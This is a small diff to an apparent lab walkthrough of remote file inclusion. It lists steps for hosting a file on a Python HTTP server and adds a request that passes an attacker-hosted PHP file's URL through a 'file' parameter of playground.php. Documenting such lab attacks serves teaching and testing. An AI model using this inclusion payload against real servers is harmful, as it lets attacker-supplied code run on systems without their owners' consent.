@@ -19,6 +19,6 @@ First, the attacker injects the malicious URL, which points to the attacker's se
 1. python3 -m http.server 8000
 2. make file
 3. http://10.0.2.15:8000/hostname.txt
-4. 
+4. http://10.114.190.223/playground.php?file=http://192.168.232.84:8000/hostname.php
 
 
